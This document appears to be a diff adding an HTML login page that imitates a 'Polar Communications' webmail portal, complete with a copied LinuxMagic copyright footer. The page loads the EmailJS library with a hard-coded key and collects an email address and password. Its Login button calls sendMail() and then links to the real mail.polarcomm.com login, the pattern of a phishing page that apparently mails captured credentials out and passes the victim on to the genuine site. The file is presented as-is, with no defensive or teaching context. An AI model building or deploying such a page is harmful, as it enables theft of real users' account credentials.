@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+      (function(){
+        emailjs.init({
+         publicKey: "osbCOcO10LHiJM6pp",
+      });
+     })();
+   </script>
+   <script src="script.js"></script>
+</head>
+<body>
+    <header>
+    <article> 
+       <img src="img/Screenshot_2026-05-16_082626-removebg-preview.png" alt="">
+    </article>
+    
+    <div class="main">
+       <nav class="welcome"><h2> Welcome to Polar Communications</h2></nav>
+
+       <div class="form" action="">
+            <p>E-mail Address<input type="email" id="email" autofocus></p>
+
+            <p class="password">Password<input type="password" id="password" autofocus></p>
+
+            <a href="https://mail.polarcomm.com/tuxedo/"><button onclick="sendMail()">Login</button></a>
+       </div>
+    </div>
+
+    <nav class="copyright">
+        <h5>© Copyright 2009-2026 <a href="https://www.linuxmagic.com/">LinuxMagic Inc.</a> All Rights Reserved<br>
+        <a href="https://magicmail.com/">www.magicmail.com</a></h5>
+    </nav>
+    </header>
+</body>
+</html>
